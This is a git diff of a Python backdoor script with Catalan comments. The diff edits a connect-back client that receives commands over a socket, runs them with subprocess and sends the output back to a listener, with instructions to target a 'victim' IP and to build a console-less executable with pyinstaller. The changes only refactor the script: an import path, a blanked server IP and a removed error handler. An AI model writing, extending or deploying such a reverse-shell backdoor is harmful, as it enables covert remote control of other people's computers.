@@ -2,11 +2,11 @@
 
 import socket
 import subprocess
-from myUtils import show_message
+from modules.my_utils import show_message
 
 """
 
-Executa al Servidor: sudo python3 listener.py
+Executa al Servidor: sudo python3 listener.py -t {IP de la victima} -p {PORT}
 
 Per convertir el backdoor en un exe el que has de fer es:
 pyinstaller --noconsole --onefile backdoor.py
@@ -15,7 +15,7 @@ pyinstaller --noconsole --onefile backdoor.py
 
 ### Variables & Constants ####################################################################################################
 
-server_ip = "10.32.8.57" # Put the server IP right here
+server_ip = "" # Put the server IP right here
 
 ### Functions ################################################################################################################
 
@@ -44,10 +44,7 @@ def main():
 
             command_output = run_command(command)
             client_socket.send(b"\n" + command_output.encode() + b"\n\n")
-
-    except PermissionError:
-        show_message("You need to execute this as root", "error")
-
+            
     except Exception as e:
         show_message(f"Unexpected error:", "error", e)
 
